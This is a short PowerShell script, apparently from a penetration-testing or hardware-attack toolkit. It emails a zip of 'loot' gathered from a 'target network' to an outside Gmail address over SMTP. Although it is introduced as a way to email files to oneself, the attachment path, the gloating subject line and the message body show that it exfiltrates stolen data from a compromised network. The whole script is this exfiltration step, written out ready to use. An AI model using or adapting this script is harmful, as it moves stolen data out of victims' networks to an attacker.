# If you ever need to email stuff to yourself via Powershell, here's one way to do it!
#
$From = "some@email.com"
$Creds = New-Object Management.Automation.PSCredential "some@email.com", ("YOUR-PASSWORD-HERE" | ConvertTo-SecureString -AsPlainText -Force)
$To = "you@your.com"
$Attachment = "C:\temp\loot\dmp.zip"
$Subject = "Muwahahhah!!"
$Body = "Here's what the bunny was able to dig up in our target network!"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $Creds -Attachments $Attachment
